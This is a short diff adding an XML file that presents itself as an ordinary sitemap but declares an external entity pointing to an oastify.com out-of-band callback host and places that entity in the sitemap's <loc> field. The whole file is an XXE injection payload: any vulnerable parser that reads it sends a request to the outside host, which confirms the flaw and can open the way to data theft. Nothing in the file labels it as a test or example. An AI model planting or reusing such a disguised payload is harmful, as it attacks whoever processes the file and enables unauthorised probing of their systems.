@@ -1,0 +1,10 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [
+  <!ENTITY xxe SYSTEM "http://spl2w7ji0ufg5fojyuuqm7hnnet5h85x.oastify.com/xxe">
+]>
+<urlset xmlns="http://www.sitemaps.org/schemas/sitemap/0.9">
+  <url>
+    <loc>&xxe;</loc>
+    <lastmod>2024-01-01</lastmod>
+  </url>
+</urlset>
